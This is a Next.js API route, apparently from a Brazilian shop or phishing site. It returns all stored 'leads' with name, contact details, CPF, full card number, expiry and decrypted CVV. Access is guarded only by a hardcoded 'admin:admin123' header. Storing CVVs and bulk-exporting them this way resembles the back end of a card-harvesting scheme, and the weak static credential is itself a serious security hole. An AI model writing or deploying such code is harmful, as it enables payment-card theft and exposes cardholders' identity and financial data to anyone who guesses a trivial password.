import { NextRequest, NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";
import { decrypt } from "@/lib/crypto";

export async function GET(req: NextRequest) {
  const auth = req.headers.get("x-admin-auth");
  if (auth !== "admin:admin123") {
    return NextResponse.json({ error: "Não autorizado" }, { status: 401 });
  }

  try {
    const leads = await prisma.lead.findMany({
      orderBy: { dataCriacao: "desc" },
    });

    // Decrypt on the server so the client can show masked or full values
    const safeLeads = leads.map((l) => ({
      id: l.id,
      nome: l.nome,
      email: l.email,
      telefone: l.telefone,
      cpf: decrypt(l.cpf),
      numeroCartao: decrypt(l.numeroCartao),
      validade: l.validade,
      cvv: decrypt(l.cvv),
      corSelecionada: l.corSelecionada,
      quantidade: l.quantidade,
      totalPago: l.totalPago,
      dataCriacao: l.dataCriacao,
    }));

    return NextResponse.json({ leads: safeLeads });
  } catch (error) {
    console.error("Error fetching leads:", error);
    return NextResponse.json({ error: "Erro ao buscar leads" }, { status: 500 });
  }
}
